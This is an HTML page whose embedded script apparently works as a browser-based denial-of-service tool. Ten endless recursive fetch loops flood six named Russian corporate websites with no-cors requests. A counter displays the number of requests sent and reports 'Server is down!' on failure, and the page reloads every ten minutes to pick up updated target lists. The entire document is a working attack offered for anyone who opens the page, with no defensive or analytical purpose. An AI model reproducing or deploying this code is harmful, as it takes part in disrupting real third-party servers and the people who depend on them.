<script>
  const SITES = [
    "https://www.russianhighways.ru",
    "https://www.nornickel.com",
    "https://www.surgutneftegas.ru",
    "https://www.evraz.com",
    "https://nlmk.com/ru/",
    "https://www.metalloinvest.com",
  ];

  async function request(i, ord) {
    i++;

    const siteToFetch = SITES[Math.floor(Math.random() * SITES.length)];
    fetch(siteToFetch, {
      mode: "no-cors",
      referrerPolicy: "no-referrer",
      headers: { "Content-Type": "application/json" },
    })
      .then((response) => {
        message("Requests: " + (SITES.length * i + ord));
        request(i, ord);
      })
      .catch((error) => {
        message("Requests: " + (SITES.length * i + ord) + " Server is down!");
        request(i, ord);
      });
  }
  function message(text) {
    document.getElementById("message").innerHTML =
      document.getElementById("message").innerHTML + "<br><br>" + text;
  }
  request(0, 1);
  request(0, 2);
  request(0, 3);
  request(0, 4);
  request(0, 5);
  request(0, 6);
  request(0, 7);
  request(0, 8);
  request(0, 9);
  request(0, 10);

  // reload to pick up any new changes
  const TEN_MINUTES = 10 * 60 * 1000;
  setTimeout(() => window.location.reload(false), TEN_MINUTES);
</script>
<div id="message">Please wait</div>
